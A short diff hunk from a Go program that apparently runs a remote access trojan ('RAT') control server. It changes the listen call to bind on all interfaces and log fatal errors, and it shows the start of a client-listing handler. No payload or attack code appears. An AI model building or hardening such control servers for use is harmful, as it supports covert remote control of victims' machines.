@@ -683,7 +683,7 @@ func main() {
 		port = "8080"
 	}
 	log.Println("Starting RAT server on port", port)
-	http.ListenAndServe(":"+port, r)
+	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, r))
 }
 
 func getClientsHandler(w http.ResponseWriter, r *http.Request) {
